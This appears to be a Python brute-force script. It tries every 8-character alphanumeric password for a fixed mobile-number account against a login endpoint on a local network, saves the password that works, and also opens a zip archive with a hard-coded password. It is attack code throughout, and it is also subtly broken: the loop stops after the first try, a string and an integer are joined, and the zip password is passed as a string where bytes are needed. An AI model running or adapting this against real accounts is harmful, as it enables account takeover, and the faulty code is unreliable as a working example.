import requests
import itertools
import json
import datetime
import zipfile


def login():
    mylist = ("".join(x) for x in itertools.product(
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        repeat=8))
    for pwd in mylist:
        data = {'mobile': '18802094078', 'password': pwd, 'areaCode': 86}
        login_url = "http://192.168.3.19:8090/Home/Public/login"
        session = requests.Session()
        resp = session.post(login_url, data)
        res = resp.content.decode('utf-8')
        j = json.loads(res)
        code = (j["status"])
        print(pwd, code)
        if code == 200:
            print(code)
            print(pwd)
            file = open('C:/burp.txt', 'w')
            file.write("正确密码是：" + pwd)
            break
        else:
            print(pwd + ":" + code)
            print(datetime.datetime.now())
            break


def burp_rar():
    zipFile = zipfile.ZipFile("C:/burp.zip", "r")
    password = '111111'
    zipFile.extractall(pwd=password)


if __name__ == '__main__':
    burp_rar()
